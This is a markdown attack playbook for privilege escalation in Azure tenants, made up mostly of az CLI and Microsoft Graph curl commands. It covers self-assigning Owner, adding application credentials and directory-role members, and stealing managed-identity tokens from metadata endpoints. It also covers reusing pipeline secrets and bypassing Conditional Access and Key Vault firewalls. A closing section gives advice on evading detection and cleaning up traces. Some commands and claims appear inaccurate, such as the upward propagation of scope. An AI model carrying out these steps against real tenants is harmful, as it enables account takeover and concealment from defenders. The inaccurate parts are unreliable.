# Azure Privilege Escalation

Privilege escalation in Azure involves moving from a lower-privileged identity to higher-privileged access within the tenant.

## Service Principal Privilege Escalation

### Excessive Role Assignments

```bash
# Check current permissions
az role assignment list --assignee {servicePrincipalId} --all

# Typical overpermissioned roles
# - "Owner" on subscription
# - "Contributor" on subscription
# - "User Access Administrator"

# If service principal has User Access Administrator role:
az role assignment create --role "Owner" \
  --assignee {highPriviledgedServicePrincipalId} \
  --scope /subscriptions/{subscriptionId}
```

### Application Owner Escalation

```bash
# Find applications where current identity is owner
curl -s https://graph.microsoft.com/v1.0/me/ownedObjects \
  -H "Authorization: Bearer $TOKEN" | jq '.value[] | select(.type=="Application") | {appId, displayName}'

# Add new owner with full access
curl -s -X POST https://graph.microsoft.com/v1.0/applications/{appId}/owners/$ref \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/{newOwnerId}"}'

# Generate new credential for application
curl -s -X POST https://graph.microsoft.com/v1.0/applications/{appId}/addPassword \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"passwordCredential":{"displayName":"Access"}}'
```

### Directory Role Escalation

```bash
# Check if current user can activate privileged roles
az ad user show --id user@company.com | jq '.assignedRoles'

# Enumerate directory roles
curl -s https://graph.microsoft.com/v1.0/directoryRoles \
  -H "Authorization: Bearer $TOKEN" | jq '.value[] | {id, displayName}'

# Attempt to activate high-privilege role
# Requires PIM enrollment or directory role eligibility

# Add user to high-privilege role
curl -s -X POST https://graph.microsoft.com/v1.0/directoryRoles/{roleId}/members/$ref \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"@odata.id":"https://graph.microsoft.com/v1.0/directoryObjects/{userId}"}'
```

## Managed Identity Privilege Escalation

### VM Metadata Service Token Extraction

```bash
# From compromised VM or App Service
TOKEN=$(curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://management.azure.com/ -H "Metadata: true" | jq -r '.access_token')

# Check what this identity can do
curl -s https://management.azure.com/subscriptions?api-version=2022-01-01 \
  -H "Authorization: Bearer $TOKEN" | jq .

# If managed identity has high privileges
az login --service-principal --username {clientId} --password {clientSecret} --tenant {tenantId}
```

### Container Managed Identity Escape

```bash
# From compromised container in App Service
curl -s "http://localhost:8081/MSI/token/Azure/?resource=https://management.azure.com" \
  -H "X-IDENTITY_HEADER: 27dac376-7233-48a5-ba80-eb178eab7529"

# Check attached managed identity permissions
TOKEN=$(curl -s "http://localhost:8081/MSI/token/Azure/?resource=https://management.azure.com" \
  -H "X-IDENTITY_HEADER: 27dac376-7233-48a5-ba80-eb178eab7529" | jq -r '.token')

# Extract credential and use elsewhere
az login --service-principal --username $CLIENT_ID --password $CLIENT_SECRET --tenant $TENANT_ID
```

## Application Access Escalation

### Graph API Permission Elevation

```bash
# Check current permissions
curl -s https://graph.microsoft.com/v1.0/me \
  -H "Authorization: Bearer $TOKEN" | jq '.scopes'

# If insufficient permissions, attempt scope elevation
# Try accessing admin-only endpoints
curl -s https://graph.microsoft.com/v1.0/auditLogs/directoryAudits \
  -H "Authorization: Bearer $TOKEN"

# Attempt admin consent bypass
# Use incremental consent to request new scopes
```

### Delegated vs App Permission Confusion

```bash
# Service principal with app permissions can access as application
# rather than delegated user

# If app has "Directory.ReadWrite.All"
# Can modify directory resources without user consent

curl -s -X PATCH https://graph.microsoft.com/v1.0/users/{userId} \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"userType":"Member"}'
```

## Conditional Access Bypass

```bash
# Check enforced Conditional Access policies
az ad conditional-access-policy list --output json

# Legacy authentication exclusion exploitation
# If policy doesn't block "Basic Authentication"
curl -s https://graph.microsoft.com/v1.0/me \
  -u "user@company.com:password"

# Multi-location policy bypass
# Use VPN to simulate different access location
# Repeat authentication attempts to trigger policy inconsistency
```

## Firewall/Network Rule Bypass

```bash
# If current IP blocked from Key Vault access
az keyvault secret show --vault-name {vaultName} --name {secret}
# Error: Client address not authorized

# Bypass via Azure service tunnel
# Use Function App or Logic App in same network

# Logic App with Key Vault connector bypasses firewall
# Create and execute Logic App accessing Key Vault
```

## RBAC Manipulation

### Role Assignment Scope Confusion

```bash
# Assign high-privilege role at lower scope
# May propagate to higher scope due to hierarchy confusion

az role assignment create --role "Owner" \
  --assignee {servicePrincipalId} \
  --scope /subscriptions/{subscriptionId}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{account}

# Verify scope escalation
az role assignment list --scope /subscriptions/{subscriptionId} \
  --assignee {servicePrincipalId}
```

### Implicit Role Elevation

```bash
# "User Access Administrator" can assign any role
# Escalate to full "Owner" access

az role assignment create --role "Owner" \
  --assignee {userId} \
  --scope /subscriptions/{subscriptionId}

# Verify
az role assignment list --assignee {userId} --all
```

## Azure DevOps Pipeline Privilege Escalation

```bash
# If in pipeline context, extract variables
# Pipeline service connection contains credentials
env | grep -i "SYSTEM_TEAM"

# Access service connection secrets
# Often has Azure AD app credentials

# Use for authentication outside pipeline
az login --service-principal \
  --username {pipelineServicePrincipalId} \
  --password {password} \
  --tenant {tenantId}
```

## PIM/Eligible Roles Activation

```bash
# Check eligible roles (if not already activated)
az ad user list --filter "mail eq 'user@company.com'" | jq .

# Attempt to activate eligible role
# Usually requires MFA

# If MFA bypass vulnerability exists (see Detection Evasion section)
# Activate privileged role
```

## Detection & Avoidance

```bash
# Escalation often logs to Azure AD sign-in logs
# Check current audit status
az monitor log-profiles list

# Bulk operations may trigger alerts
# Spread privilege escalation across time

# Use legitimate channels
# Use Azure AD Connect instead of direct Graph modifications
# Use Azure DevOps pipeline instead of direct API calls

# Clean up permission assignments
az role assignment delete --role "Owner" \
  --assignee {escalatedPrincipalId} \
  --scope /subscriptions/{subscriptionId}
```

## Key Findings

- Service principals with "Owner" or "User Access Administrator" roles
- Managed identities with subscription-level permissions
- Delegated admin relationships
- PIM-eligible roles without MFA enforcement
- Applications with app-level permissions to Graph API
